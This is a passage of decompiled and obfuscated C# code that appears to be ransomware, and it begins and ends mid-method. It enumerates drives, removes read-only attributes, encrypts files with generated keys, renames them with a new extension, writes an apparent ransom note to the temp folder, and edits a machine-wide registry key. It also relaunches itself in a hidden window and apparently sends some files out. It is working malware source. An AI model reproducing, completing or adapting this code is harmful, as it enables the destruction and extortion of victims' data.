			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void wAmkkdyfbAff()
	{
		string string_ = nTkHQcdXRpJsk(getString_0(107393579));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(hIhPBIfOSm(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(hIhPBIfOSm(getString_0(107393466)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void SCSDvwDqJmBtg()
	{
		sWjtOXvcFWJH(getString_0(107396838), hIhPBIfOSm(getString_0(107393433)));
		string text = hIhPBIfOSm(getString_0(107392727));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107392662) + text + getString_0(107392662) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396838);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void YKkpKaiVcqWl(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (zHVjUhBGwaRp)
			{
				try
				{
					File.AppendAllText(ggXwxjUYnLoRjW, getString_0(107392657) + string_0 + getString_0(107392680) + ex.Message + getString_0(107396299));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string PfYreukyJoUWR()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107394772);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107393071);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107393126))) ? getString_0(107393076) : getString_0(107393117));
				break;
			case 0:
				text = getString_0(107393131);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107393098);
				break;
			case 4:
				text = getString_0(107393085);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107393067) : getString_0(107393044));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107393011) : getString_0(107393016)) : getString_0(107393053)) : getString_0(107393062));
				break;
			case 10:
				text = getString_0(107393006);
				break;
			}
		}
		if (text != getString_0(107394772))
		{
			text = getString_0(107393033) + text;
			if (oSVersion.ServicePack != getString_0(107394772))
			{
				text = text + getString_0(107393020) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string tHqDiHXNnkA(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395969);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(hIhPBIfOSm(getString_0(107395424)));
				streamWriter.WriteLine(getString_0(107396299));
				streamWriter.WriteLine(hIhPBIfOSm(getString_0(107395270)));
				streamWriter.WriteLine(string_0);
				if (KOZeHLOdChFnG)
				{
					streamWriter.WriteLine(getString_0(107396299));
					streamWriter.WriteLine(hIhPBIfOSm(getString_0(107395640)));
					streamWriter.WriteLine(SVIZsHmxRViwKya.snRFPWIwbhbDozJy());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !TbNpXAhfsSvoF)
				{
					File.AppendAllText(text, getString_0(107395607) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (zHVjUhBGwaRp)
			{
				try
				{
					File.AppendAllText(ggXwxjUYnLoRjW, getString_0(107392983) + ex.Message + getString_0(107396299));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void OKFBognxuLrEL(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		XvnBXtsxLIyOTdJx.WfJXauRVSQef CS_0024_003C_003E8__locals0 = new XvnBXtsxLIyOTdJx();
		CS_0024_003C_003E8__locals0.EEadSgupFaX = string_1;
		CS_0024_003C_003E8__locals0.apOxHLlsJPJpn = string_2;
		CS_0024_003C_003E8__locals0.kmqiHrlZKoiIH = string_3;
		CS_0024_003C_003E8__locals0.uOovUNkLAfidy = string_4;
		IAhudorLPgiPTwRk = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.kmqiHrlZKoiIH);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396564))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !EcgGAETsov.Contains(array[i].Name))
					{
						EcgGAETsov.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!EcgGAETsov.Contains(string_0[j]))
				{
					EcgGAETsov.Add(string_0[j]);
				}
			}
		}
		if (EcgGAETsov.Contains(hIhPBIfOSm(getString_0(107392958))) && AZTVUOIWwkv == getString_0(107396921))
		{
			EcgGAETsov.Remove(hIhPBIfOSm(getString_0(107392958)));
		}
		Parallel.ForEach(EcgGAETsov, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new XvnBXtsxLIyOTdJx.WfJXauRVSQef();
			CS_0024_003C_003E8__locals0.kVRJLsqfpvYuIC = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.dPgfarpgJzO = string_0;
			if (XQCZKlShURRIWCk && !PfYreukyJoUWR().Contains(XvnBXtsxLIyOTdJx.getString_0(107393076)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						coEAEokiZKEV(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.dPgfarpgJzO);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (ofigmZpzHvUS == XvnBXtsxLIyOTdJx.getString_0(107396930))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					hadRFJJsPQGGF(CS_0024_003C_003E8__locals0.dPgfarpgJzO, CS_0024_003C_003E8__locals0.kVRJLsqfpvYuIC.EEadSgupFaX, CS_0024_003C_003E8__locals0.kVRJLsqfpvYuIC.uOovUNkLAfidy, CS_0024_003C_003E8__locals0.kVRJLsqfpvYuIC.apOxHLlsJPJpn, CS_0024_003C_003E8__locals0.kVRJLsqfpvYuIC.kmqiHrlZKoiIH);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				hadRFJJsPQGGF(CS_0024_003C_003E8__locals0.dPgfarpgJzO, CS_0024_003C_003E8__locals0.EEadSgupFaX, CS_0024_003C_003E8__locals0.uOovUNkLAfidy, CS_0024_003C_003E8__locals0.apOxHLlsJPJpn, CS_0024_003C_003E8__locals0.kmqiHrlZKoiIH);
			}
		});
	}

	public static void hadRFJJsPQGGF(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107394772));
		List<string> list3 = list2;
		if (ezqspfsAbnsACM == getString_0(107396958))
		{
			list = wxAPpDFvzisDT(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = yiCaKnHhWf.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((tlyZdyzkSThQ == getString_0(107396958) && !item.EndsWith(text)) || AELBNwHYCcQQYjz.Contains(item))
				{
					continue;
				}
				if (PWWVJdGDCC == getString_0(107396921))
				{
					try
					{
						if (TpglbWoqxiYw.fjGiiiXuVrhVe(item))
						{
							TpglbWoqxiYw.IlOHtHfGBJ(item);
						}
					}
					catch
					{
					}
				}
				AELBNwHYCcQQYjz.Add(item);
				if (!jNwNlNdFEttBjzB.Contains(Path.GetDirectoryName(item)))
				{
					jNwNlNdFEttBjzB.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (rSpXSloFudRhsO == getString_0(107396921) && fileStream.Length > Convert.ToInt32(gZpeCkfprtF) * 1024 * 1024 && !list3.Contains(text))
					{
						if (tcOSbsOVOaUxj == getString_0(107396921))
						{
							foreach (string item2 in DBmcqQetlZqvO)
							{
								if (item.ToLower().EndsWith(item2) && lPDturpXzJaF == getString_0(107396921))
								{
									if (Convert.ToInt32(vTzmcFSquAlN) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											SVIZsHmxRViwKya.IgglYVHgoJ(getString_0(107394885), getString_0(107394880), getString_0(107394835), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && lPDturpXzJaF == getString_0(107396958))
								{
									try
									{
										SVIZsHmxRViwKya.IgglYVHgoJ(getString_0(107394885), getString_0(107394880), getString_0(107394835), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = eOMPCtTZsK.elcjuQQVOuPO(item, Convert.ToInt32(gZpeCkfprtF) * 1024 * 1024);
						byte[] otiYxKZSCTfnyd = eOMPCtTZsK.APnlaCspUWtd(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						eOMPCtTZsK.dLSqiBzpdKgARW(item, otiYxKZSCTfnyd);
						if (string_2 != getString_0(107392917))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107392917))
					{
						JeXvaumsMxw(item, item + string_2, IAhudorLPgiPTwRk);
					}
					else
					{
						JeXvaumsMxw(item, item + getString_0(107392912), IAhudorLPgiPTwRk);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void LBsveUxeJuFpx(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		rSXtOPrCvtb.EofvgeegRTmuwbh CS_0024_003C_003E8__locals0 = new rSXtOPrCvtb();
		CS_0024_003C_003E8__locals0.WKleAlszVWX = list_0;
		CS_0024_003C_003E8__locals0.qpFQFAvWuxf = string_1;
		CS_0024_003C_003E8__locals0.tCWFAyAlGrLwn = string_2;
		CS_0024_003C_003E8__locals0.URYiBrqszv = string_3;
		CS_0024_003C_003E8__locals0.PPOnZKJrKRnhhng = new List<string> { getString_0(107394772) };
		if (tlyZdyzkSThQ == getString_0(107396958))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.WKleAlszVWX)
				{
					if (CS_0024_003C_003E8__locals0.tCWFAyAlGrLwn.Length != 0)
					{
						string[] tCWFAyAlGrLwn2 = CS_0024_003C_003E8__locals0.tCWFAyAlGrLwn;
						int num2 = 0;
						while (num2 < tCWFAyAlGrLwn2.Length)
						{
							string value2 = tCWFAyAlGrLwn2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_072e;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.qpFQFAvWuxf))
						{
							goto IL_072e;
						}
					}
					catch (Exception)
					{
						goto IL_072e;
					}
					if (item.EndsWith(string_0) && !AELBNwHYCcQQYjz.Contains(item))
					{
						if (PWWVJdGDCC == rSXtOPrCvtb.getString_0(107396938))
						{
							try
							{
								if (TpglbWoqxiYw.fjGiiiXuVrhVe(item))
								{
									TpglbWoqxiYw.IlOHtHfGBJ(item);
								}
							}
							catch
							{
							}
						}
						AELBNwHYCcQQYjz.Add(item);
						if (!jNwNlNdFEttBjzB.Contains(Path.GetDirectoryName(item)))
						{
							jNwNlNdFEttBjzB.Add(Path.GetDirectoryName(item));
						}
						YKkpKaiVcqWl(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ee;
								}
								goto end_IL_00ee_2;
								end_IL_00ee:;
							}
							catch (Exception ex12)
							{
								if (zHVjUhBGwaRp)
								{
									try
									{
										File.AppendAllText(ggXwxjUYnLoRjW, rSXtOPrCvtb.getString_0(107392674) + item + rSXtOPrCvtb.getString_0(107410395) + ex12.Message + rSXtOPrCvtb.getString_0(107396316));
									}
									catch (Exception)
									{
									}
								}
								XqcQqptBktg++;
								goto end_IL_00ee_2;
							}
							if (rSpXSloFudRhsO == rSXtOPrCvtb.getString_0(107396938) && new FileInfo(item).Length > Convert.ToInt32(gZpeCkfprtF) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.PPOnZKJrKRnhhng.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new rSXtOPrCvtb.hyXILXOVbnuwtIM();
								CS_0024_003C_003E8__locals0.xmJyocTlXiWmP = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.qpFQFAvWuxf != rSXtOPrCvtb.getString_0(107392934))
									{
										if (KOZeHLOdChFnG)
										{
											CS_0024_003C_003E8__locals0.qpFQFAvWuxf = nxDmDrezAzMg + CS_0024_003C_003E8__locals0.qpFQFAvWuxf;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.qpFQFAvWuxf);
									}
								}
								catch (Exception ex14)
								{
									if (zHVjUhBGwaRp)
									{
										try
										{
											File.AppendAllText(ggXwxjUYnLoRjW, rSXtOPrCvtb.getString_0(107392674) + item + rSXtOPrCvtb.getString_0(107410302) + ex14.Message + rSXtOPrCvtb.getString_0(107396316));
										}
										catch (Exception)
										{
										}
									}
									XqcQqptBktg++;
									goto end_IL_00ee_2;
								}
								CS_0024_003C_003E8__locals0.keVqdpBrbaRQ = rSXtOPrCvtb.getString_0(107394789);
								if (CS_0024_003C_003E8__locals0.qpFQFAvWuxf != rSXtOPrCvtb.getString_0(107392934))
								{
									CS_0024_003C_003E8__locals0.keVqdpBrbaRQ = item + CS_0024_003C_003E8__locals0.qpFQFAvWuxf;
								}
								else
								{
									CS_0024_003C_003E8__locals0.keVqdpBrbaRQ = item;
								}
								if (tcOSbsOVOaUxj == rSXtOPrCvtb.getString_0(107396938))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in DBmcqQetlZqvO)
										{
											if (CS_0024_003C_003E8__locals0.keVqdpBrbaRQ.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.xmJyocTlXiWmP.qpFQFAvWuxf) && lPDturpXzJaF == rSXtOPrCvtb.hyXILXOVbnuwtIM.getString_0(107396941))
											{
												if (Convert.ToInt32(vTzmcFSquAlN) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.keVqdpBrbaRQ).Length)
												{
													try
													{
														SVIZsHmxRViwKya.IgglYVHgoJ(rSXtOPrCvtb.hyXILXOVbnuwtIM.getString_0(107394905), rSXtOPrCvtb.hyXILXOVbnuwtIM.getString_0(107394900), rSXtOPrCvtb.hyXILXOVbnuwtIM.getString_0(107394855), CS_0024_003C_003E8__locals0.keVqdpBrbaRQ);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.keVqdpBrbaRQ.ToLower().EndsWith(item2) && lPDturpXzJaF == rSXtOPrCvtb.hyXILXOVbnuwtIM.getString_0(107396978))
											{
												try
												{
													SVIZsHmxRViwKya.IgglYVHgoJ(rSXtOPrCvtb.hyXILXOVbnuwtIM.getString_0(107394905), rSXtOPrCvtb.hyXILXOVbnuwtIM.getString_0(107394900), rSXtOPrCvtb.hyXILXOVbnuwtIM.getString_0(107394855), CS_0024_003C_003E8__locals0.keVqdpBrbaRQ);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = JGpqGcWWQhUPxC.DsVNjGZVhjoP(32);
								string s3 = yvxyNajvQXKErrZ.nFXfHJeIPfF(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array2 = null;
								byte[] byte_2 = eOMPCtTZsK.elcjuQQVOuPO(CS_0024_003C_003E8__locals0.keVqdpBrbaRQ, Convert.ToInt32(gZpeCkfprtF) * 1024 * 1024);
								eOMPCtTZsK.dLSqiBzpdKgARW(OtiYxKZSCTfnyd: (!plkdLSPuoWcdl) ? (TbNpXAhfsSvoF ? eOMPCtTZsK.APnlaCspUWtd(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : eOMPCtTZsK.APnlaCspUWtd(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.URYiBrqszv), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (TbNpXAhfsSvoF ? aVFnshiIDktw.CpumuidTlJzV(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : aVFnshiIDktw.CpumuidTlJzV(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.URYiBrqszv), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), DsmlTVEGDoDU: CS_0024_003C_003E8__locals0.keVqdpBrbaRQ, SmzKZYumoOEC: bytes3);
							}
							else
							{
								if (KOZeHLOdChFnG)
								{
									CS_0024_003C_003E8__locals0.qpFQFAvWuxf = nxDmDrezAzMg + CS_0024_003C_003E8__locals0.qpFQFAvWuxf;
								}
								string text4 = JGpqGcWWQhUPxC.DsVNjGZVhjoP(32);
								string s4 = yvxyNajvQXKErrZ.nFXfHJeIPfF(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.qpFQFAvWuxf != rSXtOPrCvtb.getString_0(107392934))
								{
									if (!YSyraIcgHbsYy)
									{
										if (!TbNpXAhfsSvoF)
										{
											ojeaCIHIdAVcU(item, item + CS_0024_003C_003E8__locals0.qpFQFAvWuxf, IAhudorLPgiPTwRk);
										}
										else
										{
											ojeaCIHIdAVcU(item, item + CS_0024_003C_003E8__locals0.qpFQFAvWuxf, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!TbNpXAhfsSvoF)
											{
												hrYMoqvOiHrwVxPM(item, item + CS_0024_003C_003E8__locals0.qpFQFAvWuxf, IAhudorLPgiPTwRk);
											}
											else
											{
												hrYMoqvOiHrwVxPM(item, item + CS_0024_003C_003E8__locals0.qpFQFAvWuxf, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (zHVjUhBGwaRp)
											{
												try
												{
													File.AppendAllText(ggXwxjUYnLoRjW, rSXtOPrCvtb.getString_0(107392674) + item + rSXtOPrCvtb.getString_0(107392952) + ex16.Message + rSXtOPrCvtb.getString_0(107396316));
												}
												catch (Exception)
												{
												}
											}
											XqcQqptBktg++;
											goto end_IL_00ee_2;
										}
									}
								}
								else if (!YSyraIcgHbsYy)
								{
									if (!TbNpXAhfsSvoF)
									{
										ojeaCIHIdAVcU(item, item + rSXtOPrCvtb.getString_0(107392929), IAhudorLPgiPTwRk);
									}
									else
									{
										ojeaCIHIdAVcU(item, item + rSXtOPrCvtb.getString_0(107392929), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!TbNpXAhfsSvoF)
										{
											hrYMoqvOiHrwVxPM(item, item, IAhudorLPgiPTwRk);
										}
										else
										{
											hrYMoqvOiHrwVxPM(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (zHVjUhBGwaRp)
										{
											try
											{
												File.AppendAllText(ggXwxjUYnLoRjW, rSXtOPrCvtb.getString_0(107392674) + item + rSXtOPrCvtb.getString_0(107392952) + ex18.Message + rSXtOPrCvtb.getString_0(107396316));
											}
											catch (Exception)
											{
											}
										}
										XqcQqptBktg++;
										goto end_IL_00ee_2;
									}
								}
								if (TbNpXAhfsSvoF)
								{
									if (CS_0024_003C_003E8__locals0.qpFQFAvWuxf != rSXtOPrCvtb.getString_0(107392934))
									{
										eCfTjekYzSTzH(item + CS_0024_003C_003E8__locals0.qpFQFAvWuxf, bytes4);
									}
									else
									{
										eCfTjekYzSTzH(item, bytes4);
									}
								}
							}
							goto IL_072e;
							end_IL_00ee_2:;
						}
						catch (Exception)
						{
							goto IL_072e;
						}
					}
					continue;
					IL_072e:
					CS_0024_003C_003E8__locals0.WKleAlszVWX.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.WKleAlszVWX, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new rSXtOPrCvtb.EofvgeegRTmuwbh();
			CS_0024_003C_003E8__locals0.xmJyocTlXiWmP = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.kQgEkWZKOGq = string_0;
			if (CS_0024_003C_003E8__locals0.tCWFAyAlGrLwn.Length != 0)
			{
				string[] tCWFAyAlGrLwn = CS_0024_003C_003E8__locals0.tCWFAyAlGrLwn;
				int num = 0;
				while (num < tCWFAyAlGrLwn.Length)
				{
					string value = tCWFAyAlGrLwn[num];
					if (!CS_0024_003C_003E8__locals0.kQgEkWZKOGq.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_07bb;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.kQgEkWZKOGq.EndsWith(CS_0024_003C_003E8__locals0.qpFQFAvWuxf))
				{
					goto IL_07bb;
				}
			}
			catch (Exception)
			{
				goto IL_07bb;
			}
			if (!AELBNwHYCcQQYjz.Contains(CS_0024_003C_003E8__locals0.kQgEkWZKOGq))
			{
				if (PWWVJdGDCC == rSXtOPrCvtb.getString_0(107396938))
				{
					try
					{
						if (TpglbWoqxiYw.fjGiiiXuVrhVe(CS_0024_003C_003E8__locals0.kQgEkWZKOGq))
						{
							TpglbWoqxiYw.IlOHtHfGBJ(CS_0024_003C_003E8__locals0.kQgEkWZKOGq);
						}
					}
					catch
					{
					}
				}
				AELBNwHYCcQQYjz.Add(CS_0024_003C_003E8__locals0.kQgEkWZKOGq);
				if (!jNwNlNdFEttBjzB.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.kQgEkWZKOGq)))
				{
					jNwNlNdFEttBjzB.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.kQgEkWZKOGq));
				}
				YKkpKaiVcqWl(CS_0024_003C_003E8__locals0.kQgEkWZKOGq);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.kQgEkWZKOGq).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (zHVjUhBGwaRp)
						{
							try
							{
								File.AppendAllText(ggXwxjUYnLoRjW, rSXtOPrCvtb.getString_0(107392674) + CS_0024_003C_003E8__locals0.kQgEkWZKOGq + rSXtOPrCvtb.getString_0(107410395) + ex2.Message + rSXtOPrCvtb.getString_0(107396316));
							}
							catch (Exception)
							{
							}
						}
						XqcQqptBktg++;
						goto end_IL_0117_2;
					}
					if (rSpXSloFudRhsO == rSXtOPrCvtb.getString_0(107396938) && new FileInfo(CS_0024_003C_003E8__locals0.kQgEkWZKOGq).Length > Convert.ToInt32(gZpeCkfprtF) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.qpFQFAvWuxf != rSXtOPrCvtb.getString_0(107392934))
							{
								if (KOZeHLOdChFnG)
								{
									CS_0024_003C_003E8__locals0.qpFQFAvWuxf = nxDmDrezAzMg + CS_0024_003C_003E8__locals0.qpFQFAvWuxf;
								}
								File.Move(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq + CS_0024_003C_003E8__locals0.qpFQFAvWuxf);
							}
						}
						catch (Exception ex4)
						{
							if (zHVjUhBGwaRp)
							{
								try
								{
									File.AppendAllText(ggXwxjUYnLoRjW, rSXtOPrCvtb.getString_0(107392674) + CS_0024_003C_003E8__locals0.kQgEkWZKOGq + rSXtOPrCvtb.getString_0(107410302) + ex4.Message + rSXtOPrCvtb.getString_0(107396316));
								}
								catch (Exception)
								{
								}
							}
							XqcQqptBktg++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.qpFQFAvWuxf != rSXtOPrCvtb.getString_0(107392934))
						{
							CS_0024_003C_003E8__locals0.kQgEkWZKOGq += CS_0024_003C_003E8__locals0.qpFQFAvWuxf;
						}
						if (tcOSbsOVOaUxj == rSXtOPrCvtb.getString_0(107396938))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in DBmcqQetlZqvO)
								{
									if (CS_0024_003C_003E8__locals0.kQgEkWZKOGq.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.xmJyocTlXiWmP.qpFQFAvWuxf) && lPDturpXzJaF == rSXtOPrCvtb.EofvgeegRTmuwbh.getString_0(107396944))
									{
										if (Convert.ToInt32(vTzmcFSquAlN) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.kQgEkWZKOGq).Length)
										{
											try
											{
												SVIZsHmxRViwKya.IgglYVHgoJ(rSXtOPrCvtb.EofvgeegRTmuwbh.getString_0(107394908), rSXtOPrCvtb.EofvgeegRTmuwbh.getString_0(107394903), rSXtOPrCvtb.EofvgeegRTmuwbh.getString_0(107394858), CS_0024_003C_003E8__locals0.kQgEkWZKOGq);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.kQgEkWZKOGq.ToLower().EndsWith(item3) && lPDturpXzJaF == rSXtOPrCvtb.EofvgeegRTmuwbh.getString_0(107396981))
									{
										try
										{
											SVIZsHmxRViwKya.IgglYVHgoJ(rSXtOPrCvtb.EofvgeegRTmuwbh.getString_0(107394908), rSXtOPrCvtb.EofvgeegRTmuwbh.getString_0(107394903), rSXtOPrCvtb.EofvgeegRTmuwbh.getString_0(107394858), CS_0024_003C_003E8__locals0.kQgEkWZKOGq);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = JGpqGcWWQhUPxC.DsVNjGZVhjoP(32);
						string s = yvxyNajvQXKErrZ.nFXfHJeIPfF(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = eOMPCtTZsK.elcjuQQVOuPO(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, Convert.ToInt32(gZpeCkfprtF) * 1024 * 1024);
						eOMPCtTZsK.dLSqiBzpdKgARW(OtiYxKZSCTfnyd: (!plkdLSPuoWcdl) ? (TbNpXAhfsSvoF ? eOMPCtTZsK.APnlaCspUWtd(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : eOMPCtTZsK.APnlaCspUWtd(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.URYiBrqszv), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (TbNpXAhfsSvoF ? aVFnshiIDktw.CpumuidTlJzV(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : aVFnshiIDktw.CpumuidTlJzV(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.URYiBrqszv), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), DsmlTVEGDoDU: CS_0024_003C_003E8__locals0.kQgEkWZKOGq, SmzKZYumoOEC: bytes);
					}
					else
					{
						if (KOZeHLOdChFnG)
						{
							CS_0024_003C_003E8__locals0.qpFQFAvWuxf = nxDmDrezAzMg + CS_0024_003C_003E8__locals0.qpFQFAvWuxf;
						}
						string text2 = JGpqGcWWQhUPxC.DsVNjGZVhjoP(32);
						string s2 = yvxyNajvQXKErrZ.nFXfHJeIPfF(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.qpFQFAvWuxf != rSXtOPrCvtb.getString_0(107392934))
						{
							if (!YSyraIcgHbsYy)
							{
								if (!TbNpXAhfsSvoF)
								{
									ojeaCIHIdAVcU(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq + CS_0024_003C_003E8__locals0.qpFQFAvWuxf, IAhudorLPgiPTwRk);
								}
								else
								{
									ojeaCIHIdAVcU(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq + CS_0024_003C_003E8__locals0.qpFQFAvWuxf, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!TbNpXAhfsSvoF)
									{
										hrYMoqvOiHrwVxPM(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq + CS_0024_003C_003E8__locals0.qpFQFAvWuxf, IAhudorLPgiPTwRk);
									}
									else
									{
										hrYMoqvOiHrwVxPM(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq + CS_0024_003C_003E8__locals0.qpFQFAvWuxf, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (zHVjUhBGwaRp)
									{
										try
										{
